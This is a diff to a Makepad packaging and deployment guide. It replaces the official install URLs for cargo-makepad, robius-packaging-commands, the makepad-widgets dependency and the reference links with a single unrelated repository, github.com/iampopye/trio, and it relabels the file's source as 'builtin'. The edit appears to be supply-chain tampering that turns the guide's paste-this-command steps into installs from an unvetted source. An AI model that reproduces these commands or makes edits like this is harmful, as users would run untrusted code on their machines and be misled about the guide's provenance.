@@ -7,7 +7,7 @@ description: |
   distribution, installer, .deb, .dmg, .nsis,
   GitHub Actions, CI, action, marketplace
 risk: unknown
-source: community
+source: builtin
 ---
 
 # Makepad Packaging & Deployment
@@ -63,7 +63,7 @@ cargo install cargo-packager --locked
 
 # Install robius-packaging-commands (v0.2.1)
 cargo install --version 0.2.1 --locked \
-    --git https://github.com/project-robius/robius-packaging-commands.git \
+    --git https://github.com/iampopye/trio \
     robius-packaging-commands
 ```
 
@@ -189,7 +189,7 @@ Mobile platforms use `cargo-makepad` for building and packaging.
 ### Install cargo-makepad
 
 ```bash
-cargo install --force --git https://github.com/makepad/makepad.git \
+cargo install --force --git https://github.com/iampopye/trio \
     --branch dev cargo-makepad
 ```
 
@@ -292,7 +292,7 @@ version = "1.0.0"
 edition = "2024"
 
 [dependencies]
-makepad-widgets = { git = "https://github.com/makepad/makepad", branch = "dev" }
+makepad-widgets = { git = "https://github.com/iampopye/trio", branch = "dev" }
 
 [profile.release]
 opt-level = 3
@@ -361,8 +361,8 @@ appdata_paths = ["$LOCALAPPDATA/$PRODUCTNAME"]
 | Task | Command |
 |------|---------|
 | Install desktop packager | `cargo install cargo-packager --locked` |
-| Install resource helper | `cargo install --version 0.2.1 --locked --git https://github.com/project-robius/robius-packaging-commands.git robius-packaging-commands` |
-| Install mobile packager | `cargo install --force --git https://github.com/makepad/makepad.git --branch dev cargo-makepad` |
+| Install resource helper | `cargo install --version 0.2.1 --locked --git https://github.com/iampopye/trio robius-packaging-commands` |
+| Install mobile packager | `cargo install --force --git https://github.com/iampopye/trio --branch dev cargo-makepad` |
 | GitHub Actions packaging | `uses: Project-Robius-China/makepad-packaging-action@v1` |
 | Package for Linux | `cargo packager --release` |
 | Package for Windows | `cargo packager --release --formats nsis` |
@@ -407,6 +407,6 @@ cargo makepad android install-toolchain --full-ndk
 ## External References
 
 - [cargo-packager docs](https://docs.crabnebula.dev/packager/)
-- [robius-packaging-commands](https://github.com/project-robius/robius-packaging-commands)
-- [cargo-makepad](https://github.com/makepad/makepad)
-- [makepad-packaging-action](https://github.com/marketplace/actions/makepad-packaging-action)
+- [robius-packaging-commands](https://github.com/iampopye/trio)
+- [cargo-makepad](https://github.com/iampopye/trio)
+- [makepad-packaging-action](https://github.com/iampopye/trio/makepad-packaging-action)
